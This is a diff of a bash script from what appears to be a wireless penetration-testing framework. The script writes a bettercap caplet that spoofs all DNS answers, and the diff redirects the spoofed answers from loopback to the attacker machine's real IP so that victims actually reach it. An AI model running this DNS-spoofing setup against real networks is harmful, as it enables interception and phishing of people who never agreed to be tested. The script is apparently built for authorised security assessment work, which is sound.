@@ -24,11 +24,6 @@
 
 set -euo pipefail
 
-C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
-C_VAR="${ASTRA_COLOR_VAR:-}"
-C_BOLD="${ASTRA_COLOR_BOLD:-}"
-C_ACTION="${ASTRA_COLOR_ACTION:-}"
-C_RESET="${ASTRA_COLOR_RESET:-}"
 
 # Inputs from Environment
 INTERFACE="${WIFI_INTERFACE:-}"
@@ -50,21 +45,31 @@ CAPLET_FILE="${EVIDENCE_PREFIX}_bettercap.cap"
 JSON_LOG="${EVIDENCE_DIR}/${TC_ID}_bettercap.json"
 LOG_FILE="${EVIDENCE_DIR}/${TC_ID}_bettercap.log"
 
+# Determine attacker's IP on this interface — DNS spoofing must point to the
+# attacker's machine, not 127.0.0.1 (which resolves to the CLIENT's own loopback).
+LOCAL_IP=$(ip -4 addr show "$INTERFACE" 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 | head -1)
+if [[ -z "$LOCAL_IP" ]]; then
+    echo "[!] Could not determine local IP on $INTERFACE. Cannot spoof DNS to unreachable address."
+    exit 1
+fi
+echo "[*] DNS spoofing will redirect to attacker IP: ${LOCAL_IP}"
+
 # Cleanup function
 cleanup() {
     echo "[*] Cleaning up bettercap processes..."
-    [[ -n "${BC_PID:-}" ]] && kill "$BC_PID" 2>/dev/null || true
+    [[ -n "${TOOL_PID:-}" ]] && kill "$TOOL_PID" 2>/dev/null || true
+    [[ -n "${TEL_PID:-}" ]] && kill "$TEL_PID" 2>/dev/null || true
 }
 trap cleanup EXIT
 
 # 1. Use bettercap for DNS spoofing
 if command -v bettercap &>/dev/null; then
-    echo "[*] Starting bettercap DNS spoofing..."
-    
+    echo "[*] Starting bettercap DNS spoofing (redirecting to ${LOCAL_IP})..."
+
     # Create caplet
     cat <<EOF > "$CAPLET_FILE"
 set dns.spoof.all true
-set dns.spoof.address 127.0.0.1
+set dns.spoof.address $LOCAL_IP
 set events.stream.output $JSON_LOG
 dns.spoof on
 events.stream on
@@ -86,11 +91,11 @@ EOF
 
     # 2. RUN PRIMARY TOOL (Foreground in Window, Background with Wait otherwise)
     if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
-        timeout --foreground "$SCAN_TIME" bettercap -iface "$INTERFACE" -caplet "$CAPLET_FILE" || true
+        timeout --foreground "$SCAN_TIME" bettercap -iface "$INTERFACE" -caplet "$CAPLET_FILE" 2>&1 | tee "$LOG_FILE" || true
     else
-        timeout --foreground "$SCAN_TIME" bettercap -iface "$INTERFACE" -caplet "$CAPLET_FILE" > "$LOG_FILE" 2>&1 &
+        timeout "$SCAN_TIME" bettercap -iface "$INTERFACE" -caplet "$CAPLET_FILE" > "$LOG_FILE" 2>&1 &
         TOOL_PID=$!
-        wait $TOOL_PID || true
+        wait "$TOOL_PID" || true
     fi
 
     kill "$TEL_PID" 2>/dev/null || true
